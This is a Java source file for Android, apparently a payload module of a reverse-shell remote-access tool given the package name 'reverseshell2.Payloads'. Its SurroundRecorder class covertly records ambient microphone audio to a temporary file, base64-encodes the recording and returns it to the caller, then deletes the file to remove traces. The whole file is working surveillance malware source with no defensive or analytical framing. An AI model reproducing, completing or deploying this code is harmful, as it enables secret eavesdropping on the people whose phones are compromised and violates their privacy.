package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;

public class SurroundRecorder {

    private static final String TAG = "SurroundRecorder";
    private MediaRecorder recorder;
    private String outputPath;
    private boolean isRecording = false;
    private Context context;

    public SurroundRecorder(Context context) {
        this.context = context;
    }

    public String startRecording() {
        if (isRecording) {
            return "Already recording ambient audio.";
        }

        try {
            File outputDir = context.getCacheDir();
            File outputFile = File.createTempFile("surround_", ".mp3", outputDir);
            outputPath = outputFile.getAbsolutePath();

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setAudioSamplingRate(44100);
            recorder.setOutputFile(outputPath);

            recorder.prepare();
            recorder.start();
            isRecording = true;

            Log.d(TAG, "Ambient recording started: " + outputPath);
            return "Ambient recording started.";
        } catch (Exception e) {
            Log.e(TAG, "Failed to start ambient recording", e);
            return "ERROR: " + e.getMessage();
        }
    }

    public String stopRecording() {
        if (!isRecording || recorder == null) {
            return "No recording in progress.";
        }

        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            isRecording = false;

            // Read the file and return as base64
            File file = new File(outputPath);
            if (file.exists()) {
                FileInputStream fis = new FileInputStream(file);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int len;
                while ((len = fis.read(buffer)) != -1) {
                    bos.write(buffer, 0, len);
                }
                fis.close();

                String encoded = Base64.encodeToString(bos.toByteArray(), Base64.DEFAULT);
                file.delete(); // cleanup

                Log.d(TAG, "Ambient recording stopped, size: " + bos.size() + " bytes");
                return encoded;
            }
            return "ERROR: Recording file not found";
        } catch (Exception e) {
            Log.e(TAG, "Failed to stop ambient recording", e);
            return "ERROR: " + e.getMessage();
        }
    }

    public boolean isRecording() {
        return isRecording;
    }
}
